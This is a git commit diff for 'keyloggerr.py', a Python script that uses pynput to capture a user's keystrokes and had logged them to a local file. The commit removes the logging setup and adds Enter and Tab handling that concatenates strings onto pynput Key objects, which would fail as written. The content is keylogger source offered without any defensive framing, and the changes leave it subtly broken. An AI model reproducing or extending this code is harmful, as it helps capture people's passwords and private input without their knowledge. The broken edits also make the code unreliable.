5511936db136de1072bf9418d5f1291ed2535878
coderroots <coderroots004@gmail.com>
2025-07-25 17:13:58 +0530

    Update keyloggerr.py

--- keyloggerr.py
+++ keyloggerr.py
@@ -1,10 +1,9 @@
 from pynput.keyboard import Key, Listener
-import logging
 
 # Log file setup
 log_file = "keylog.txt"
-logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s:%(message)s')
 
+keys = []
 # Function for key press
 def on_press(key):
     try:
@@ -15,7 +14,12 @@ def on_press(key):
 # Function for key release
 def on_release(key):
     if key == Key.esc:  # Fix here
-        return False  # Stop the listener
+        return False
+    elif key == Key.enter:
+        key += '\n'
+    elif key == Key.tab:
+        key += '\t'
+        # Stop the listener
 
 # Start listening
 with Listener(on_press=on_press, on_release=on_release) as listener:
